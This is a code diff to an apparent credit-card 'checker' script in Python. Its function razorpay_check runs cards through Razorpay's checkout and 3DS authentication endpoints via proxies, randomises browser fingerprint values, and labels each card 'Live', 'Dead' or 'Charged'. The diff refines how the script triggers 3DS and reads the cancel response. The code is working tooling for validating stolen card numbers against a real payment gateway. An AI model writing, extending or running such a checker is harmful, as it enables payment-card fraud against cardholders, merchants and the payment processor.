@@ -308,7 +308,8 @@ async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
 
             rzp_ref = (f'{RZ_API}/v1/checkout/public?traffic_env=production'
                        f'&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1'
-                       f'&new_session=1&unified_session_id={session_id}')
+                       f'&new_session=1&unified_session_id={session_id}'
+                       f'&session_token={sessid}')
             std_h = {
                 'Accept':          '*/*',
                 'Origin':          'https://api.razorpay.com',
@@ -416,28 +417,81 @@ async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
                     ' Try another payment method or contact your bank for details.', '').strip()
                 reason  = err_obj.get('reason', '')
                 label   = f"{desc} ({reason})" if reason and reason not in desc else desc
-
                 if any(k in desc.lower() for k in _LIVE_KEYWORDS) or reason in _LIVE_REASONS:
                     return {'status': 'Live', 'message': label or 'Live', 'card': card}
                 return {'status': 'Dead', 'message': label or 'Declined', 'card': card}
 
-            # 3DS / OTP
+            pid_clean = payment_id.split('_', 1)[-1] if '_' in payment_id else payment_id
+
+            # 3DS / OTP — return Live immediately
             nxt = r7.get('next', {})
             if nxt and nxt.get('action') in ('redirect', 'otp_generate', 'otp_validate'):
                 return {'status': 'Live', 'message': '3DS / OTP Required', 'card': card}
 
-            # Cancel (cleanup)
+            # ── Step 6: pg_router authenticate (3DS trigger) ────────────────
+            _screens = [[1920, 1080], [1366, 768], [1536, 864], [1440, 900]]
+            _sc      = random.choice(_screens)
+            _depth   = random.choice([24, 32])
             try:
-                await s.get(
-                    f'{RZ_API}/v1/standard_checkout/payments/{payment_id}/cancel',
-                    params={'key_id': key_id, 'session_token': sessid, 'keyless_header': keyless},
-                    headers=std_h, proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
+                await s.post(
+                    f'{RZ_API}/pg_router/v1/payments/{payment_id}/authenticate',
+                    data={},
+                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                    proxy=proxy, timeout=aiohttp.ClientTimeout(total=8)
+                )
+            except Exception:
+                pass
+            await asyncio.sleep(1)
+            try:
+                await s.post(
+                    f'{RZ_API}/pg_router/v1/payments/{pid_clean}/authenticate',
+                    data={
+                        'browser[java_enabled]':       'false',
+                        'browser[javascript_enabled]': 'true',
+                        'browser[timezone_offset]':    '0',
+                        'browser[color_depth]':        str(_depth),
+                        'browser[screen_width]':       str(_sc[0]),
+                        'browser[screen_height]':      str(_sc[1]),
+                        'browser[language]':           'en-US',
+                        'auth_step':                   '3ds2Auth',
+                    },
+                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                    proxy=proxy, timeout=aiohttp.ClientTimeout(total=8)
                 )
             except Exception:
                 pass
 
-            return {'status': 'Charged', 'message': f'Payment {payment_id}', 'card': card}
+            # ── Step 7: Cancel + read result ────────────────────────────────
+            cancel_text = ''
+            try:
+                async with s.get(
+                    f'{RZ_API}/v1/standard_checkout/payments/{payment_id}/cancel',
+                    params={'key_id': key_id, 'session_token': sessid, 'keyless_header': keyless},
+                    headers={**std_h, 'Content-Type': 'application/x-www-form-urlencoded'},
+                    proxy=proxy, timeout=aiohttp.ClientTimeout(total=12)
+                ) as rc:
+                    cancel_text = await rc.text(errors='ignore')
+            except Exception:
+                pass
+
+            if 'razorpay_payment_id' in cancel_text:
+                return {'status': 'Charged', 'message': f'Payment {payment_id}', 'card': card}
+
+            try:
+                c_data   = json.loads(cancel_text) if cancel_text else {}
+                c_err    = c_data.get('error', {})
+                c_desc   = c_err.get('description', '').replace(
+                    ' Try another payment method or contact your bank for details.', '').strip()
+                c_reason = c_err.get('reason', '')
+                c_label  = f"{c_desc} ({c_reason})" if c_reason and c_reason not in c_desc else c_desc
+                if any(k in c_desc.lower() for k in _LIVE_KEYWORDS) or c_reason in _LIVE_REASONS:
+                    return {'status': 'Live', 'message': c_label or 'Live', 'card': card}
+                if c_label:
+                    return {'status': 'Dead', 'message': c_label, 'card': card}
+            except Exception:
+                pass
+
+            return {'status': 'Dead', 'message': f'Cancelled ({payment_id})', 'card': card}
 
     except asyncio.TimeoutError:
         return {'status': 'Error', 'message': 'Timeout', 'card': card}
